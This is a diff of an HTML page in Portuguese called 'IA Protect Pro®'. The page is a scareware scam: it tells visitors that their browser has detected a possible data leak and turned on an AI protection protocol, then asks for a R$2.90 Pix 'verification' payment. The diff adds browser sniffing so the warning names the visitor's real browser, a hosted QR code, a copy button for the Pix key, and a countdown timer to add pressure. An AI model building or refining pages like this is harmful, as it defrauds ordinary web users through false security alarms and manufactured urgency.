@@ -1,63 +1,106 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>IA Protect Pro®</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IA Protect Pro® – Varredura de Segurança</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
+      background-color: #f8f9fa;
       text-align: center;
-      padding: 30px;
+      padding: 40px 20px;
     }
-    h1 {
-      font-size: 28px;
-      margin-bottom: 10px;
+    .cadeado {
+      font-size: 1.5em;
+      color: #f0b429;
     }
     .alerta {
       color: red;
       font-weight: bold;
-      margin-bottom: 20px;
     }
-    .pix-valor {
-      font-weight: bold;
+    .info {
+      margin: 15px 0;
       font-size: 18px;
-      margin-top: 20px;
     }
-    .expira {
-      color: #d00;
-      font-size: 12px;
-      margin-top: 20px;
+    .bold {
+      font-weight: bold;
     }
-    .copiar-btn {
-      background-color: #333;
-      color: #fff;
-      padding: 10px 20px;
+    .qr {
+      margin: 20px auto;
+      width: 200px;
+    }
+    .copy-btn {
+      background-color: #e0e0e0;
       border: none;
-      border-radius: 4px;
-      margin-top: 15px;
+      padding: 10px;
+      margin-top: 10px;
       cursor: pointer;
+      border-radius: 6px;
+      font-family: monospace;
+    }
+    .contador {
+      font-size: 16px;
+      color: #333;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <h1>🔒 IA Protect Pro®</h1>
+
+  <div class="cadeado">🔒 IA Protect Pro®</div>
+
   <h2>Segurança de conexão ativada</h2>
-  <p class="alerta">⚠️ Vazamento de dados em potencial detectado.</p>
-  <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
-  <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
+  <p class="alerta">🚨 Vazamento de dados em potencial detectado.</p>
 
-  <p class="pix-valor">🔐 Valor único de verificação: R$ 2,90</p>
-  <p style="font-size: 11px; color: #777;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
+  <p class="info">O navegador <span class="bold" id="browser-name">detectando...</span> ativou automaticamente o protocolo <span class="bold">IA Protect Pro®</span>, com tecnologia baseada em Inteligência Artificial.</p>
 
-  <!-- IMAGEM DO QR CODE INSERIDA CONFORME SOLICITADO -->
-  <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD..." alt="QR Code" width="220" height="220">
+  <p class="info">Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
 
-  <br><br>
-  <button class="copiar-btn" onclick="navigator.clipboard.writeText('00020126580014BR.GOV.BCB.PIX01367a97187a-4475-4468-92b5-a8dc1d83aeda52040000530398654042.905802BR5923SUL INTERMEDIACOES LTDA6006ITAJAI62120508IAPROTEC630446DB')">
-    Copiar código Pix
-  </button>
+  <p class="info">
+    <span class="bold">Valor único de verificação: R$ 2,90</span>
+  </p>
 
-  <p class="expira">⏳ Sua autenticação expira em 22 segundos.</p>
+  <p style="font-size: 13px;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
+
+  <!-- QR Code fixo que você enviou -->
+  <img class="qr" src="https://i.postimg.cc/Y9ZKP5kK/qrcode-real.png" alt="QR Code Pix">
+
+  <div>
+    <button class="copy-btn" onclick="copiarPix()">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey</button>
+  </div>
+
+  <div class="contador">
+    ⏳ Sua autenticação expira em <span id="timer">60</span> segundos.
+  </div>
+
+  <script>
+    // Detectar navegador
+    const navegador = navigator.userAgent;
+    const browserName = navegador.includes("Firefox") ? "Mozilla Firefox" :
+                        navegador.includes("OPR") || navegador.includes("Opera") ? "Opera" :
+                        navegador.includes("Chrome") ? "Google Chrome" :
+                        "seu navegador";
+
+    document.getElementById("browser-name").textContent = browserName;
+
+    // Timer regressivo
+    let tempo = 60;
+    const timerEl = document.getElementById("timer");
+    const intervalo = setInterval(() => {
+      tempo--;
+      timerEl.textContent = tempo;
+      if (tempo <= 0) clearInterval(intervalo);
+    }, 1000);
+
+    // Copiar chave Pix
+    function copiarPix() {
+      const chave = "00020126360014BR.GOV.BCB.PIX0111qrfakepixkey";
+      navigator.clipboard.writeText(chave).then(() => {
+        alert("Chave Pix copiada!");
+      });
+    }
+  </script>
+
 </body>
 </html>
